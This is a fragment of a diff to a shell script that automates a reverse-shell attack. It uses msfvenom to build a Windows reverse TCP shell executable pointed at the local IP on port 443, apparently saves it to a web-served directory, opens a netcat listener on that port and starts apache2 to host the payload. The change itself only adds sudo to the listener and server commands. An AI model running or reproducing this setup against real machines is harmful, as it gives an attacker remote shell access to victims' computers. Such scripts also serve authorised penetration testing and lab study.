@@ -16,9 +16,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$ipAddress LPORT=443 -f exe > /var/w
 
 echo -e "Opening listener ..."
 
-gnome-terminal --tab --title="listener" --command="bash -c 'nc -lvp 443; $SHELL'"
+gnome-terminal --tab --title="listener" --command="bash -c 'sudo nc -lvp 443; $SHELL'"
 
 
 echo -e "Starting apache2 server ..."
 
-gnome-terminal --tab --title="server" --command="bash -c 'service apache2 start; $SHELL'"
+gnome-terminal --tab --title="server" --command="bash -c 'sudo service apache2 start; $SHELL'"
